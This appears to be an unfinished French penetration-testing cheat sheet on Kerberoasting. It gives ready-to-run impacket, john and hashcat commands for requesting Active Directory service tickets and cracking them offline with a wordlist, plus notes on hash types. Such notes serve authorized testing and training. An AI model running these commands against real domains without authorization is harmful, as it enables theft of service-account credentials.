---
description: A finir
---

# Kerberoast

### Récupération des tickets TGS

```
GetUsersSPN.py -request -dc-ip <IP-DC> <domain.local>/<USER> -outputfile impacket_TGS_<IP>.txt
```

### Cassage des hashs obtenus

```
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
```

Plusieurs format de hash peuvent être obtenu :

* $17 : AES128
* $18 : AES256 (-m 19700 sur [hashcat](../cassage-dempreinte/hashcat.md), pas pris en compte par [john](../cassage-dempreinte/john.md))
* $23 : RC4-HMAC-MD5 (pris en compte par [john](../cassage-dempreinte/john.md))
